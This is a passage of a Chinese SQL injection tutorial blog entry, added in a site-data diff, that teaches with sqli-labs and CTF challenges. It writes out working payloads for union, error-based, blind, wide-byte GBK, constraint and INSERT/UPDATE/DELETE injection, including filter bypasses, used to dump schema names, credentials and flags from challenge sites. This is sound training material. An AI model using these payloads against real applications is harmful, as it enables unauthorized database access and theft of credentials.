@@ -6377,6 +6377,376 @@
 ]]></content>
   </entry>
   <entry>
+    <title>SQL注入</title>
+    <url>/2019/11/10/hgohr1/</url>
+    <content><![CDATA[<h1 id="环境相关"><a href="#环境相关" class="headerlink" title="环境相关"></a>环境相关</h1><p>phpstudy：<br><a href="https://www.xp.cn" target="_blank" rel="noopener">https://www.xp.cn</a></p>
+<p>sqli-labs：<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
+<p>sublime：<br><a href="https://www.sublimetext.com/" target="_blank" rel="noopener">https://www.sublimetext.com/</a></p>
+<p>具体搭建方式可以参考网上的教程<br>这里提供看雪论坛的一个在线 sqli-labs：<a href="http://43.247.91.228:84/" target="_blank" rel="noopener">http://43.247.91.228:84/</a></p>
+<h1 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h1><p>数据在数据库中是按照表单的方式存储的，在 phpstudy 里面，可以很方便的打开 mysql 终端<br>（打开后输入默认密码 root）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461842773-c072384e-87c2-4b75-bfc6-8247ac3ea217.png#align=left&display=inline&height=250&name=image.png&originHeight=499&originWidth=928&size=301910&status=done&style=none&width=464" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用  <code>show databases;</code>  命令可以查看所有的数据库名<br>我的存在数据库：information_schema，challenges，mysql，performance_schema，security，test，yichen</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461099740-907a0ae6-9bb7-4a99-9973-2fb0937a448e.png#align=left&display=inline&height=313&name=image.png&originHeight=341&originWidth=363&size=20251&status=done&style=none&width=333" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>其中：<strong>information_schema</strong> 数据库是 MySQL 自带的，在 MySQL 中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。数据库里面几张重要的表的状态我放在这，如果后面涉及这几张表不太明白可以回来看一下</p>
+<p><code>use yichen;</code>  用来选择想要使用的数据库</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461487799-565a79c5-5278-4aee-8057-dca7d3b59a95.png#align=left&display=inline&height=82&name=image.png&originHeight=91&originWidth=241&size=5533&status=done&style=none&width=218" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用  <code>show tables;</code>  来显示数据库中的所有数据表</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461593350-90cbee18-612b-4b6f-ac1a-e065bae4e209.png#align=left&display=inline&height=149&name=image.png&originHeight=212&originWidth=308&size=11196&status=done&style=none&width=217" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用  <code>select * from yichen;</code>  来查看数据表”yichen”中所有的数据信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461958036-f609eaaa-922f-4eb2-a954-48f7d4eefe39.png#align=left&display=inline&height=146&name=image.png&originHeight=220&originWidth=376&size=19901&status=done&style=none&width=250" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>数据表：yichen 中一共有三列数据，列名分别是：id，name，age<br>如果想查看 yichen 表中 writeup 的年龄应该怎样那？<br>有两种简单的方法：<br><code>select age from yichen where name=&#39;writeup&#39;;</code><br><code>select age from yichen where id=2;</code><br>这里需要注意的是 name 字段属于字符串，所以需要用单引号引起来</p>
+<p>那其实当我们访问一个网页上的时候比如 sqli-labs 的第一关：<br>?id=1 实际上就是去数据库里面查询 id=1 的时候的 name 和 password 列的值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573462434520-3b672c43-8219-48a4-bef9-095410f4a486.png#align=left&display=inline&height=284&name=image.png&originHeight=568&originWidth=1920&size=189095&status=done&style=none&width=960" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>补充一些关于 information_schema 数据库的数据表的信息：</p>
+<p><strong>SCHEMATA 表：</strong>提供了当前 mysql 中所有数据库的信息（主要用来查询数据库名（schema_name））</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474150129-3f2bd79e-a202-4e8e-b856-0aafde35fa82.png#align=left&display=inline&height=168&name=image.png&originHeight=350&originWidth=1338&size=163038&status=done&style=none&width=644" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><strong>TABLES 表：</strong>提供了关于数据库中的表的信息（包括视图）(有点乱…)</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472943149-8b1d46ce-6403-48f5-8ac8-f213e5ffc4b5.png#align=left&display=inline&height=223&name=image.png&originHeight=486&originWidth=1270&size=113816&status=done&style=none&width=582" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在 phpmyadmin 里可以看的清楚点（主要用来查询数据表名 (table_name)）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474346090-85d104c4-c093-464b-8af4-5ef3b1c300c3.png#align=left&display=inline&height=189&name=image.png&originHeight=340&originWidth=887&size=64474&status=done&style=none&width=494" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><strong>COLUMNS 表：</strong>提供了表中的列信息（主要用来查询字段名（column_name））</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474209881-b5b2a5cf-5a19-420b-ad6f-fbb690f1ff67.png#align=left&display=inline&height=157&name=image.png&originHeight=313&originWidth=1043&size=66447&status=done&style=none&width=521.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="sql-注入原理"><a href="#sql-注入原理" class="headerlink" title="sql 注入原理"></a>sql 注入原理</h1><p>前面提到访问?id=1 的时候就是去数据库里查询 id=1 的字段的值，那么，当我不去正常访问 id=1 而是访问一个 id=1’会发生什么？报错了！</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463020241-ea253b3e-aecf-4e98-b0b8-0be5199c9291.png#align=left&display=inline&height=271&name=image.png&originHeight=542&originWidth=1373&size=172843&status=done&style=none&width=686.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>看报错的回显发现<br>您的 SQL 语法有误； 检查与您的 MySQL 服务器版本相对应的手册以获取正确的语法，以在第 1 行的’’1’’ LIMIT 0,1’附近使用<br>仔细看一下，’’1’’ LIMIT 0,1’，会发现单引号是这么配对的<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463731758-49360687-a0f8-4af2-97c5-12069ba95d80.png#align=left&display=inline&height=54&name=image.png&originHeight=112&originWidth=456&size=6056&status=done&style=none&width=219" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure></p>
+<p>也就是说我们输入的 1’  去查询的时候出问题了，我们可以查看一下 less-1 的源代码，找到查询语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))<span class="comment">//使用get方式接受一个参数id</span></span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];<span class="comment">//把get得到的id的值赋给变量id</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;<span class="comment">//使用这条语句去查询</span></span><br><span class="line">$result=mysql_query($sql);<span class="comment">//把查询的结果给result这个变量</span></span><br><span class="line">$row = mysql_fetch_array($result);<span class="comment">//把结果变成了数组的形式</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)<span class="comment">//如果得到结果就把他展示出来↓</span></span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="comment">//没有得到结果就展示mysql操作产生的文本错误信息</span></span><br><span class="line">	&#123;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们只要关心这一句<br><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></p>
+<p>把之前传入的 <code>1&#39;</code>  带入 <code>$id</code> 看看结果<br><code>SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1</code></p>
+<p>会发现传入的单引号把原本已经存在的那一个左单引号闭合掉了，那多出来的那一个右单引号就出了问题了</p>
+<p>使用  and 1=1–+<br>mysql 中的注释有两种，一个是 <code>--空格</code>，一个是 <code>#</code><br><a href="https://blog.csdn.net/xiayun1995/article/details/86500605" target="_blank" rel="noopener">sql 注入中的注释符的解释</a></p>
+<p><code>&#39;order by 4--+</code> 得到列数<br>order by  是用来排序的，后面可以跟着列数，比如 order by 1  是按照第一列来排序，当使用大于数据表有的列数的时候就肯定会报错了，这样就可以用来判断有几列</p>
+<p><code>-1&#39;union select 1,2,3--+</code>  联合查询，一般用来检查什么地方可以回显</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472008439-91aa61d7-2a5e-4929-afb0-64fe8df559bd.png#align=left&display=inline&height=220&name=image.png&originHeight=440&originWidth=1376&size=70475&status=done&style=none&width=688" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>显示出 2,3，说明这里 2 与 3 的位置会被打印出来，我们就可以把想要查询的放在这里两个位置让他显示给我们</p>
+<p>这里介绍几个字符连接函数：</p>
+<ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据<br>因为我们查询到的数据不是只有一个，所以需要用连接函数把他们连接成一串才能显示出来</li>
+</ol>
+<p><code>union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
+<p>这句话把查询到的  <code>schema_name（数据库名）</code>  连成了一串字符串在 name 的地方显示出来<br>从 information_schema 中的 schemata  这个表里面查询的，中间用  <code>.</code> 连接起来，所以上面那一条语句查询了所有数据库名并显示在  name（2） 的地方</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474481281-18fecc49-5917-4e34-a730-d5b0054557ab.png#align=left&display=inline&height=208&name=image.png&originHeight=415&originWidth=1349&size=72758&status=done&style=none&width=674.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>那接下来只要替换 2  处的查询内容与后面的 from  的表就可以查询出所有的表名与列名了</p>
+<p>查询所有表名：<br><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474896594-dfc43372-dd3b-47a8-9037-f0460bef89c1.png#align=left&display=inline&height=207&name=image.png&originHeight=413&originWidth=1244&size=55397&status=done&style=none&width=622" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>查询所有列名：<br><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474926265-8d50bcaf-9796-405d-bed7-639c0849b1dd.png#align=left&display=inline&height=193&name=image.png&originHeight=385&originWidth=1254&size=54980&status=done&style=none&width=627" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>那么已经知道所有的表名跟列名了，怎么去查询表中的数据呐？<br><code>union select 1,username,password from users where id=6--+</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476264699-97a5fce4-fbb6-4551-8126-0ceb79276812.png#align=left&display=inline&height=211&name=image.png&originHeight=421&originWidth=1070&size=54460&status=done&style=none&width=535" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>自己根据源代码尝试做一下前四关，语句基本一样，只要改一个地方就可以<br>源代码在解压出来的文件夹中的 Less 开头的里面的 index.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476353408-77d91a36-00ca-415c-9dce-2140ab497eed.png#align=left&display=inline&height=296&name=image.png&originHeight=592&originWidth=623&size=69060&status=done&style=none&width=311.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>hint：只需要注意这个地方就可以了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476448206-c9771d69-5745-4a2e-9697-dc7a7c661f05.png#align=left&display=inline&height=71&name=image.png&originHeight=142&originWidth=588&size=33010&status=done&style=none&width=294" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>rand()产生 0-1 之间的随机数<br>floor()向下取整</p>
+<h2 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h2><p>假设有一个 users 表</p>
+<table>
+<thead>
+<tr>
+<th>user_id</th>
+<th>user_name</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>yichen</td>
+<td>6666666</td>
+</tr>
+<tr>
+<td>2</td>
+<td>chenaa</td>
+<td>7777777</td>
+</tr>
+<tr>
+<td>3</td>
+<td>tttttest</td>
+<td>8888888</td>
+</tr>
+<tr>
+<td>4</td>
+<td>flaggg</td>
+<td>9999999</td>
+</tr>
+</tbody></table>
+<p>进行如下查询：<br>select count(<em>),(concat(floor(rand(0)</em>2),‘@’,(select version())))x from users group by x</p>
+<p>floor(rand(0)*2)产生的结果为固定的 011011</p>
+<p>进行 group by 时会产生一个新的虚拟表，group by 时他后面的语句会运算两次，（对比，插入）<br>刚开始虚拟表是空的：</p>
+<table>
+<thead>
+<tr>
+<th>x</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Null</td>
+<td>Null</td>
+</tr>
+</tbody></table>
+<p>现在当去扫描原始表的第一项时 floor(rand(0)*2)第一次运算，结果为 0，当插入的时候会进行第二次运算这时候就变成了 1，插入后表的内容就变成了</p>
+<table>
+<thead>
+<tr>
+<th>x</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="mailto:1@5.7.19">1@5.7.19</a></td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>当扫描第二项 floor(rand(0)<em>2)得到 1，但是<a href="mailto:1@5.7.19">1@5.7.19</a>已经存在了，不需要插入，只需要改 count(</em>)</p>
+<table>
+<thead>
+<tr>
+<th>x</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="mailto:1@5.7.19">1@5.7.19</a></td>
+<td>2</td>
+</tr>
+</tbody></table>
+<p>扫描第三项时 floor(rand(0)<em>2)得到 0，表中没有，需要插入，但是插入的时候进行了第二次运算，floor(rand(0)</em>2)成了 1</p>
+<p>但是虚拟表中已经有了<a href="mailto:1@5.7.19">1@5.7.19</a>，x 作为主键，是不允许存在相同的，所以就报错了</p>
+<h2 id="其他函数介绍"><a href="#其他函数介绍" class="headerlink" title="其他函数介绍"></a>其他函数介绍</h2><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>上面两个需要传入 xpath 格式的字符串，但是传入的却不符合，但可以执行，所以报错</p>
+<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>mysql 重复特性，此处重复了 version，所以报错，有些地方不管用</p>
+<p>如果等号“=”被禁用了，可以使用 like 或&lt;&gt;替换，&lt;&gt;意思是不等于，在前面加上！意思就是等于，<br>如：<br><code>select 1,group_concat(tablem_name) where !(table_schema &lt;&gt; security)</code></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>实验吧题目：<a href="">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<blockquote>
+<p>爆库：username=’and updatexml/<em>&amp;password=</em>/(1,concat(0x23,database()),3) and ‘1</p>
+<p>爆表：username=’and updatexml/<em>&amp;password=</em>/(1,concat(0x23,(select group_concat(table_name)from information_schema.tables where !(table_schema&lt;&gt;database()))),3) and ‘1</p>
+<p>爆列：username=’and updatexml/&amp;password=/(1,concat(0x23,(select group_concat(column_name)from information_schema.columns where !(table_schema&lt;&gt;database()) and !(table_name&lt;&gt;’ffll44jj’) )),3) and ‘1</p>
+<p>爆字段：username=’ or updatexml/<em>&amp;password=1</em>/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or ‘</p>
+</blockquote>
+<h1 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h1><h2 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h2><p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))<br>if 判断语句，第一个参数（判断语句）为假，返回第三个参数 sleep(5)，第一个参数为真，返回第二个参数 0<br>sleep 语句会等规定的秒数</p>
+<p>(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(‘true’)), false))<br>benchmark(count,expr)用来执行 expr 表达式 count 次数，执行一个函数若干次就会延长时间，这样就可以用来代替 sleep 函数<br>这种方法有个听着贼牛逼的名字：<strong>侧信道攻击</strong></p>
+<h2 id="截取函数"><a href="#截取函数" class="headerlink" title="截取函数"></a>截取函数</h2><p>substr(string,start,length)        查看 string 从第 start 开始的 length 位<br>substr(DATABASE(),1,1)&gt;’a’      数据库名第一位<br>substr(DATABASE(),1,2)&gt;’ad’    数据库名前两位</p>
+<p>substring(str,start,len)    等价于   substring(str from start for len)  这样就可以不用逗号进行查询<br>防止逗号被过滤掉</p>
+<p>substring_index(str,delim,count)      被截取的字段，关键字，关键字出现的次数<br>比如 substring_index(‘aaabbbccc’,’b’,2)     b 出现第二次之前的东西</p>
+<p>select case when 条件<br>select case when username=’admin’ then ‘aaa’ else(sleep(3)) end from user<br>在 if 判断中的逗号被过滤，用这个代替</p>
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a><br>(题目环境崩了)</p>
+<h1 id="bool-型盲注"><a href="#bool-型盲注" class="headerlink" title="bool 型盲注"></a>bool 型盲注</h1><h2 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h2><p>mid(str,start,len)<br>left(str,len)<br>right(str,len)</p>
+<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p>106.12.37.37:8080</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="常见几个-url-转码"><a href="#常见几个-url-转码" class="headerlink" title="常见几个 url 转码"></a>常见几个 url 转码</h2><blockquote>
+<p><strong>空格        %20</strong> &gt; <strong>‘             %27</strong> &gt; <strong>#            %23</strong> &gt; <strong>/            %5C</strong> &gt; <strong>%09       TAB 键（水平）</strong> &gt; <strong>%0a        新建一行</strong> &gt; <strong>%0b       TAB 键（垂直）</strong> &gt; <strong>%0c        新的一页</strong> &gt; <strong>%0d       return 功能</strong> &gt; *<em>%a0        空格<br>*</em></p>
+</blockquote>
+<h2 id="php-函数-addslashes"><a href="#php-函数-addslashes" class="headerlink" title="php 函数 addslashes()"></a>php 函数 addslashes()</h2><p>作用：使用反斜线引用字符串</p>
+<p>对以下生效生效：</p>
+<blockquote>
+<p><strong>单引号：’</strong> &gt; <strong>反斜线：/</strong> &gt; <strong>双引号：”</strong> &gt; <strong>空值：NULL</strong></p>
+</blockquote>
+<p>它会在这些之前加上反斜线，这样单引号就是字符串里面的一个，而没有单引号在代码中的作用</p>
+<p>如何逃逸？</p>
+<ol>
+<li>在反斜线之前再加一个反斜线，这样就把反斜线给转义了</li>
+<li><strong>把反斜线弄没（即宽字节注入）</strong></li>
+</ol>
+<h2 id="宽字节手工注入"><a href="#宽字节手工注入" class="headerlink" title="宽字节手工注入"></a>宽字节手工注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 url 编码之后，如果%后面的两个字符的值（十六进制形式）超过了 128（ascii 码最大表示），会默认为 GBK 形式，而 Mysql 在进行编码是认为 GBK 形式两个字符才算一个汉字</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>单引号被反斜线转义：<br><code>&#39; --&gt; \&#39; --&gt; %5C%27</code><br>当在单引号之前加上%aa 时<br><code>%aa&#39; --&gt; %aa\&#39; --&gt; ``%aa%5C``%27</code><br>会认为%aa%5C 是一对</p>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>教程里会用到一些简单的 sql 手工注入知识，sqli-labs 靶场自己搭建一个环境，先做 1-4 应该就能明白他是在干啥<br>链接：<a href="https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q" target="_blank" rel="noopener">https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q</a><br>提取码：a4oy</p>
+<p>南邮新平台：<a href="https://cgctf.nuptsast.com/challenges" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges</a><br>对应题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<blockquote>
+<p>爆库：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,group_concat(schema_name) from information_schema.schemata –+</p>
+<p>爆表：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572 –+</p>
+<p>爆列：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x67626b73716c69 –+</p>
+<p>爆字段：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;</a> union select 1,flag from gbksqli –+</p>
+</blockquote>
+<h1 id="基于约束的-SQL-攻击"><a href="#基于约束的-SQL-攻击" class="headerlink" title="基于约束的 SQL 攻击"></a>基于约束的 SQL 攻击</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在 MySQL 进行数据插入的时候会把空格忽略掉，而且超过 30（也可能是别的数）个以后的也会舍弃<br>如果数据库中存在：<br><code>username：admin</code><br><code>password：password</code><br>再插入：<br><code>username：admin 空格*30 1</code><br><code>password：666</code><br>这样数据库里就会有以下数据：</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin</td>
+<td>password</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>666</td>
+</tr>
+</tbody></table>
+<p>虽然插入的时候用户名为  username：admin  空格*30  1<br>但是 MySQL 进行检索的时候会认为时 admin（忽略空格，忽略 30 字以后的）<br>这样就意味着可以自定义一个 admin 的密码进行登录</p>
+<h2 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h2><p>bugku 题目：<a href="https://ctf.bugku.com/challenges#login1(SKCTF)" target="_blank" rel="noopener">https://ctf.bugku.com/challenges#login1(SKCTF)</a></p>
+<h1 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order_by 注入"></a>order_by 注入</h1><h2 id="order-by-语法格式"><a href="#order-by-语法格式" class="headerlink" title="order_by 语法格式"></a>order_by 语法格式</h2><p>order_by {column_name[ASC|DESC]}[,n]<br>默认按照升序进行排序，在不知道列名的情况下可以通过列的序号代替相应的列<br>注意：order_by 不能运算，如 order_by 1+1  与 order_by 2  是不一样的</p>
+<h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p><a href="http://chall.tasteless.eu/level1/index.php?dir=ASC" target="_blank" rel="noopener">http://chall.tasteless.eu/level1/index.php?dir=ASC</a></p>
+<h1 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h1><h2 id="insert：插入"><a href="#insert：插入" class="headerlink" title="insert：插入"></a>insert：插入</h2><p>报错语法：(报错就能把数据库带出来)也能插进去。<br>insert into data1 (id,name,year) values (‘’,’attacker’ or updatexml(1,concat(0x7e,database()),0),10);</p>
+<h2 id="update-更新"><a href="#update-更新" class="headerlink" title="update:更新"></a>update:更新</h2><p>报错语法：(报错就能把数据库带出来)<br>update data1 set year=11 or updatexml(1,concat(0x7e,database()),0) where id =7;</p>
+<h2 id="delete-删除"><a href="#delete-删除" class="headerlink" title="delete:删除"></a>delete:删除</h2><p>(报错就能把数据库带出来)<br>delete from data1 where id =7 or updatexml(1,concat(0x7e,database()),0);</p>
+<h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><a href="http://chall.tasteless.eu/level15/index.php" target="_blank" rel="noopener">http://chall.tasteless.eu/level15/index.php</a></p>
+<h1 id="DESC-注入"><a href="#DESC-注入" class="headerlink" title="DESC 注入"></a>DESC 注入</h1><p>{describe|desc} tbl<em>name [col_name |wild]<br>describe 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 sql 通配符字符 “%”和“</em>”的字符串。</p>
+<p>mysql 中反引号：``  用于保留字符</p>
+<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p>web.jarvisoj.com:32794<br>提示：源码：<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p>
+<blockquote>
+<p>爆库：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select database() limit 1 offset 1</p>
+<p>爆表：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1 offset 1</p>
+<p>爆列：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1 offset 1</p>
